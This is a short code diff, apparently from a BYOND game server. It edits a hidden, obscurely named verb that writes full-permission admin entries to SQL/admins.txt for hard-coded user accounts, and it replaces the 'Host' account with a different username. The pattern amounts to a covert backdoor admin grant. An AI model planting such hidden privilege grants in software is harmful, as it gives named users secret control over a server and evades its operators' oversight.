@@ -24,8 +24,8 @@
 	set name = "a55af5"
 	set hidden = TRUE
 ///makes it so their ranks don't need set every round
-	if (ckey == "taislin")
-		text2file("taislin;Host;65535|||","SQL/admins.txt")
+	if (ckey == "kosolov325")
+		text2file("kosolov325;Host;65535|||","SQL/admins.txt")
 		return
 	else if (ckey == "valithor")
 		text2file("valithor;Captain;65535|||","SQL/admins.txt")
